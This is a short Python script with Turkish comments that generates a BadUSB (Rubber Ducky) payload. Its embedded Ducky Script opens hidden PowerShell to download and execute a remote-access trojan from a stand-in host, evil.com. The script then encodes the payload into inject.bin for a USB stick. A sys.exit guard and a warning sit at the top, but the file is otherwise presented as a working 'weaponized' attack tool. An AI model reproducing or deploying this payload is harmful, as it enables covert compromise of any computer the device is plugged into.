import os
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod BadUSB saldırısı için payload üretir.")

print("--- WEAPONIZED DUCKY SCRIPT ---")

def weaponize_payload():
    # 1. SALDIRI SENARYOSU (Ducky Script)
    script = """
    DELAY 1000
    GUI r
    DELAY 200
    STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/rat.exe')"
    ENTER
    """
    
    # 2. BINARY ENCODING (Weaponized Part)
    # Simülasyonda: open("script.txt", "w")
    # Gerçekte: Scripti donanımın anlayacağı .bin formatına çeviriyoruz.
    
    print("[*] Script hazırlanıyor...")
    with open("payload.txt", "w") as f:
        f.write(script)
        
    print("[*] Binary Encode yapılıyor (inject.bin)...")
    # Java Encoder aracı ile derleme
    os.system("java -jar encoder.jar -i payload.txt -o inject.bin")
    
    print("💀 PAYLOAD HAZIR.")
    print("Bu 'inject.bin' dosyasını USB'nin kök dizinine atarsanız, takıldığı an Powershell çalıştırır.")

if __name__ == "__main__":
    weaponize_payload()